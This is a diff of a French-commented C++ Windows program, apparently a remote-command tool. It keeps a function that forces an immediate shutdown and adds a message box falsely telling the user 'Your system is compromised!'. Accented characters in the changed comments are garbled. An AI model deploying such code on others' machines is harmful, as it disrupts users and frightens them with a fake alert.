@@ -17,7 +17,7 @@ using namespace std;
 #pragma comment(lib, "wininet.lib")
 
 // =============================================================
-// Fonction relatives au commandes éxécutables par le main
+// Fonction relatives au commandes ï¿½xï¿½cutables par le main
 // =============================================================
 
 /*
@@ -30,15 +30,20 @@ string parseCommand(const string& input, string& command, string& argument) {
 }
 */
 
-// Fonction pour éteindre l'ordinateur
+// Fonction pour ï¿½teindre l'ordinateur
 void shtd() {
     system("shutdown /s /t 0");
 }
 
-// Fonction pour éffectuer un WIN + D
+// Fonction pour ï¿½ffectuer un WIN + D
 void wind() {
     keybd_event(VK_LWIN, 0, 0, 0);
     keybd_event('D', 0, 0, 0);
     keybd_event('D', 0, KEYEVENTF_KEYUP, 0);
     keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
+}
+
+// Affiche une boï¿½te de dialogue d'alerte.
+void ShowMessage() {
+    MessageBox(NULL, TEXT("Votre systï¿½me est compromis !"), TEXT("Alerte"), MB_OK);
 }
